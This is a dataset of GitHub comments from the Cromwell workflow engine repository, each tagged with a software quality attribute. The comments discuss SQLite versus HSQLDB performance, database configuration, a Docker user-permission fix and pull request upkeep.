https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2712,Modifiability,config,configuration,2712,"al file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no matter whether the workflow is large or small. It is a gotcha to be aware of, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:571,Performance,queue,queued,571,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1198,Performance,perform,performed,1198,"more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initial",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1846,Performance,perform,perform,1846," of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:11,Testability,benchmark,benchmarking,11,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1644,Testability,test,testing,1644,"e is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minim",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650:414,Modifiability,config,config,414,"Hi @rhpvorderman-. Thanks for giving this PR a full work out. I don't have a lot of experience running SQLite so for others who might want to follow in your steps your experience is very valuable. A few requests/questions:; - For the other reviewers do you have an itemized list of things this PR would need before it should be merged?; - Based on your testing is anything missing from our Centaur regression test config?; - Do you have the time to submit changes to the PR to polish it up (hopefully mostly docs)?. For the lurkers, I'll try to reply with my comments and hypotheses in a follow-up reply this week. Ex: when/why did we create two databases in Cromwell, and how I think that affects SQLite which only wants \*one\* connection per DB.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650:353,Testability,test,testing,353,"Hi @rhpvorderman-. Thanks for giving this PR a full work out. I don't have a lot of experience running SQLite so for others who might want to follow in your steps your experience is very valuable. A few requests/questions:; - For the other reviewers do you have an itemized list of things this PR would need before it should be merged?; - Based on your testing is anything missing from our Centaur regression test config?; - Do you have the time to submit changes to the PR to polish it up (hopefully mostly docs)?. For the lurkers, I'll try to reply with my comments and hypotheses in a follow-up reply this week. Ex: when/why did we create two databases in Cromwell, and how I think that affects SQLite which only wants \*one\* connection per DB.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650:409,Testability,test,test,409,"Hi @rhpvorderman-. Thanks for giving this PR a full work out. I don't have a lot of experience running SQLite so for others who might want to follow in your steps your experience is very valuable. A few requests/questions:; - For the other reviewers do you have an itemized list of things this PR would need before it should be merged?; - Based on your testing is anything missing from our Centaur regression test config?; - Do you have the time to submit changes to the PR to polish it up (hopefully mostly docs)?. For the lurkers, I'll try to reply with my comments and hypotheses in a follow-up reply this week. Ex: when/why did we create two databases in Cromwell, and how I think that affects SQLite which only wants \*one\* connection per DB.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:481,Deployability,update,updated,481,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:737,Deployability,pipeline,pipeline,737,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:509,Modifiability,config,config,509,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:218,Testability,test,testing,218,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:558,Testability,test,testing,558,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:625,Testability,test,testing,625,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:823,Testability,test,test,823,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:839,Testability,test,tests,839,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:429,Usability,clear,clearly,429,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:744,Deployability,release,release,744,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:783,Deployability,patch,patched,783,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:73,Performance,perform,performs,73,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:173,Performance,bottleneck,bottlenecked,173,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:295,Performance,perform,performance,295,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:619,Performance,perform,performant,619,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857
https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141:157,Deployability,configurat,configuration,157,"I solved this issue on my workstation by passing the $EUID variable as the docker_user parameter in the backend.providers.LocalExample.config section of the configuration file: ; ```; runtime-attributes = """"""; String? docker; #String? docker_user # Uncommenting to try the EUID fix for root files and inability to hardlink; String docker_user = ""$EUID""; """"""; ```; After that, docker outputs were no longer owned by root. . Hope it helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141
https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141:59,Modifiability,variab,variable,59,"I solved this issue on my workstation by passing the $EUID variable as the docker_user parameter in the backend.providers.LocalExample.config section of the configuration file: ; ```; runtime-attributes = """"""; String? docker; #String? docker_user # Uncommenting to try the EUID fix for root files and inability to hardlink; String docker_user = ""$EUID""; """"""; ```; After that, docker outputs were no longer owned by root. . Hope it helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141
https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141:135,Modifiability,config,config,135,"I solved this issue on my workstation by passing the $EUID variable as the docker_user parameter in the backend.providers.LocalExample.config section of the configuration file: ; ```; runtime-attributes = """"""; String? docker; #String? docker_user # Uncommenting to try the EUID fix for root files and inability to hardlink; String docker_user = ""$EUID""; """"""; ```; After that, docker outputs were no longer owned by root. . Hope it helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141
https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141:157,Modifiability,config,configuration,157,"I solved this issue on my workstation by passing the $EUID variable as the docker_user parameter in the backend.providers.LocalExample.config section of the configuration file: ; ```; runtime-attributes = """"""; String? docker; #String? docker_user # Uncommenting to try the EUID fix for root files and inability to hardlink; String docker_user = ""$EUID""; """"""; ```; After that, docker outputs were no longer owned by root. . Hope it helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764894141
https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764906695:36,Modifiability,config,config,36,@AlesMaver Can you share your whole config file?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764906695
https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-756438492:304,Usability,simpl,simply,304,"Hi @myazinn, thanks for your PR. Since you've got a few PRs open, we've added you as a collaborator so you can make branches directly in our repo. This enables our CI to run automatically for you (we are careful with it because it runs workflows in the cloud with real money). To take advantage of this, simply push a new branch to the `broadinstitute/cromwell` repo and create a new PR, for this one as well as https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081. Thank you again for your contributions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-756438492
https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799:625,Performance,perform,performance,625,"Hi @aednichols @cjllanwarne ; I'm really sorry for long reply. I'm so overworked that it took a month for me to get this done.; I've rebased this pull request, as well as two others (https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081) at the develop branch.; Unfortunately, I couldn't find a way to resolve all comments. I did add tests to the CallCacheDiffActorSpec in this PR https://github.com/broadinstitute/cromwell/pull/6081. But I didn't find a way to properly test this PR https://github.com/broadinstitute/cromwell/pull/6072 nor to check how it will affect performance.; Please let me know if this PRs are okay for you in their current state. I can make some minor changes if required. But If they require a lot of time than I'm afraid I won't be able to maintain them and it's better to close them. I promise this time I'll respond to your comments faster :); Huge thanks for your invitation, although it already expired. I would love to continue to contribute to Cromwell. But right now it's almost impossible for me to find enough time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799
https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799:390,Testability,test,tests,390,"Hi @aednichols @cjllanwarne ; I'm really sorry for long reply. I'm so overworked that it took a month for me to get this done.; I've rebased this pull request, as well as two others (https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081) at the develop branch.; Unfortunately, I couldn't find a way to resolve all comments. I did add tests to the CallCacheDiffActorSpec in this PR https://github.com/broadinstitute/cromwell/pull/6081. But I didn't find a way to properly test this PR https://github.com/broadinstitute/cromwell/pull/6072 nor to check how it will affect performance.; Please let me know if this PRs are okay for you in their current state. I can make some minor changes if required. But If they require a lot of time than I'm afraid I won't be able to maintain them and it's better to close them. I promise this time I'll respond to your comments faster :); Huge thanks for your invitation, although it already expired. I would love to continue to contribute to Cromwell. But right now it's almost impossible for me to find enough time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799
